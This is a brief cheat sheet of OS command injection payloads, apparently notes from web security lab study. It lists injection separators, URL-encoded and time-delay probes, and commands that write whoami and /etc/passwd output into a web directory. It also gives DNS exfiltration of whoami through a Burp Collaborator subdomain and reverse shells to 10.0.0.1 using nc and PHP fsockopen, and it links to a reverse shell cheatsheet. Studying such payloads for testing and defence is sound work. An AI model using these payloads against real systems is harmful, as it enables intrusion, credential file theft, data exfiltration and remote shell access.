///// OS COMMAND INJECTION SYNTAX "" & your command # "" / "" || your commans || ""

& whoami # ///// URLencoded ==> %26+sleep+10+%23
||+whoami+||

TIME Delay ==>
||ping+-c+10+127.0.0.1||
& sleep 10 #

Storing file to view
||whoami>/var/www/images/output.txt||
||cat /etc/passwd >/var/www/images/output.txt||


/// COLLABORATOR server
||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
|nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||


/// reverse shell 

||nc 10.0.0.1 4242 -e /bin/bash||
||php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'||

PAYLOADS LINK: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md